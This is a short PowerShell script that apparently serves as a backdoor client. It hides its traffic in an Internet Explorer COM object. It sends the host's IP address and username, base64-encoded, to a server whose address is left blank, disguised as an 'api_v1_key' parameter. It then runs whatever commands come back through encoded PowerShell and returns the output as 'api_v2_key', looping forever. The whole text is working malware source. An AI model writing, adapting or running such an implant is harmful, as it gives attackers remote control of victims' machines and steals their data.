$srv = ''
$ie = new-object -com internetexplorer.application
$ip = get-wmiobject Win32_NetworkAdapterConfiguration | where {$_.Ipaddress.length -gt 1}
$x = $ip.ipaddress[0] + '|' + $env:USERNAME

while (1) {
  $msg = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($x))
  $ie.navigate($srv + '?api_v1_key=' + $msg)
  while ($ie.busy) {sleep -milliseconds 100}
  sleep -seconds 3
  write-host 'cmd:' $ie.document.firstchild.innertext
  $cmd = [Convert]::ToBase64String([Text.Encoding]::Unicode.GetBytes($ie.document.firstchild.innertext))
  $res = powershell.exe -enc $cmd
  $resx = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes([String]::join("`n", $res)))
  $msg = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($x + '|' + $resx))
  $ie.navigate($srv + '?api_v2_key=' + $msg)
  while ($ie.busy) {sleep -milliseconds 100}
  sleep -seconds 3
}
